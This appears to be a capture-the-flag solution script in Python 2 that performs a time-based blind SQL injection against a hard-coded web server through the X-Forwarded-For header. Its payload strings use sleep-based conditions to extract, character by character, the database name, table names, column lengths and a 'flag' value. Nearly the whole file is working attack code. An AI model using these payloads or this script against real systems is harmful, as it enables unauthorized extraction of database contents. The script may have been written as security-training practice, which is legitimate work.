# -*- coding:utf-8 -*-


import requests
URL="http://123.206.87.240:8002/web15/"

'''
data="1'and(select case when\
	    (length(database())={0})\
	    then sleep(5) else 1 end)and '1'='1"
'''
database_length="1'and(select case when(length(database())={0})then sleep(5) else 1 end)and '1'='1"  
database_name="1'and(select case when(ascii(substr((select database()) from {0} for 1))={1})then sleep(5) else 1 end)and '1'='1"
table_length="1'and(select case when\
(length((select group_concat(table_name)from information_schema.tables where table_schema='web15'))={0})\
then sleep(5) else 1 end)and '1'='1"
table_name="1'and(select case when\
(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='web15')from {0} for 1 ))={1})\
then sleep(5) else 1 end)and '1'='1"
column_length="1'and(select case when\
(length((select group_concat(column_name) from information_schema.columns where table_name='flag'))={0})\
then sleep(5) else 1 end)and '1'='1"
get_flag="1'and(select case when(ascii(substr((select flag from flag) from {0} for 1))={1})then sleep(5) else 1 end)and '1'='1"


#使用闭包使得for循环中的变量不会只得到最后
def x_forwarded_for():
	def fun(p,q):
		def gu():
			data=table_name.format(p,q)    #使用format函数使得对应的变量能够改变
			headers={"X-Forwarded-FOR":data}
			try:
				response=requests.get(URL,headers=headers,timeout=4)
			except requests.exceptions.ReadTimeout:    #捕捉到超时连接时的ASCII值
				print p,q,chr(q)
		return gu
	fs=[]
	for i in range(1,15):
		for j in range(32,128):
			fs.append(fun(i,j))
	return fs
	'''
		def fun(j=i):
			data="1'and(select case when(length(database())={0})then sleep(5) else 1 end)and '1'='1"
			data=data.format(j)
			headers={"X-Forwarded-FOR":data}
			try:
				response=requests.get(URL,headers=headers,timeout=4)
			except :
				print j
			print response.text
	    return fun
	    '''

if __name__=='__main__':
	a=x_forwarded_for()
	for i in a:
		if i() is not None:
			print i()
